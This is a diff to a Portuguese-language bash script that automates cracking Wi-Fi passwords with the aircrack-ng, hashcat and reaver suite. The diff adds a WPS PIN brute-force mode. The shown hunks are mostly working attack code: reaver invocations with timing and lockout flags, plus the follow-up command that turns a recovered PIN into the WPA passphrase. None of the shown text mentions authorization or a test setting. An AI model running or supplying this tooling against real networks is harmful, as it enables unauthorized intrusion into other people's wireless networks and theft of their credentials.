@@ -5,8 +5,9 @@
 # Automatiza, usando a suite aircrack-ng + hcxtools + hashcat + reaver:
 #   1. Coloca a interface em modo monitor
 #   2. Escaneia e lista os APs (SSID, BSSID, canal)
-#   3. Ataca por um de tres vetores:
+#   3. Ataca por um de quatro vetores:
 #        - wps       : Pixie Dust (reaver/bully + pixiewps) - rapido em TP-Link
+#        - wps-bf    : bruteforce do PIN do WPS (fallback do Pixie Dust)
 #        - handshake : captura handshake WPA2 (deauth opcional) + dicionario
 #        - pmkid     : captura PMKID (sem cliente) + dicionario
 #   4. Recupera a senha
@@ -43,7 +44,7 @@ uso() {
 Uso: sudo $0 -i <interface> [opcoes]
 
   -i IFACE      interface wireless (ex.: wlan0)            [obrigatorio]
-  -m MODO       wps | handshake (padrao) | pmkid
+  -m MODO       wps | wps-bf | handshake (padrao) | pmkid
   -b BSSID      MAC do AP alvo (pula o scan interativo)
   -c CANAL      canal do AP alvo
   -t CLIENTE    MAC de cliente para deauth direcionado (modo handshake)
@@ -133,9 +134,23 @@ ataque_wps() {
     info "Iniciando ataque Pixie Dust (reaver -K 1). Pode levar de segundos a minutos..."
     reaver -i "$MON" -b "$BSSID" -c "$CANAL" -K 1 -N -vv || true
     echo
-    info "Se o Pixie Dust falhar, tente o PIN por bruteforce (mais lento):"
-    echo "    sudo reaver -i $MON -b $BSSID -c $CANAL -vv"
-    echo "  ou, com o PIN em maos, recupere a senha:"
+    info "Se o Pixie Dust falhar, use o modo -m wps-bf (bruteforce do PIN)."
+}
+
+ataque_wps_bf() {
+    for bin in reaver wash; do
+        command -v "$bin" >/dev/null || { erro "'$bin' nao instalado (sudo apt install -y reaver)."; exit 1; }
+    done
+    if [ "$CANAL" -gt 14 ] 2>/dev/null; then
+        warn "Canal $CANAL e 5 GHz; WPS so existe em 2.4 GHz. Use o BSSID de 2.4 GHz."
+    fi
+    warn "Bruteforce de PIN e LENTO (ate ~11000 tentativas) e pode travar com"
+    warn "rate-limiting do AP. Use -d/-l para ajustar os atrasos se travar."
+    info "Iniciando bruteforce do PIN do WPS com reaver..."
+    # -d 2: atraso entre tentativas; --no-nacks e -L ajudam em APs problematicos
+    reaver -i "$MON" -b "$BSSID" -c "$CANAL" -vv -d 2 -L -N || true
+    echo
+    info "Com o PIN recuperado, extraia a senha WPA com:"
     echo "    sudo reaver -i $MON -b $BSSID -c $CANAL -p <PIN>"
 }
 
@@ -183,9 +198,10 @@ ataque_pmkid() {
 
 case "$MODO" in
     wps)       escolher_alvo; ataque_wps ;;
+    wps-bf)    escolher_alvo; ataque_wps_bf ;;
     handshake) escolher_alvo; ataque_handshake ;;
     pmkid)     escolher_alvo; ataque_pmkid ;;
-    *) erro "Modo invalido: '$MODO' (use wps | handshake | pmkid)."; exit 1 ;;
+    *) erro "Modo invalido: '$MODO' (use wps | wps-bf | handshake | pmkid)."; exit 1 ;;
 esac
 
 ok "Fluxo concluido. Arquivos com prefixo '${SAIDA}' ficaram no diretorio atual."
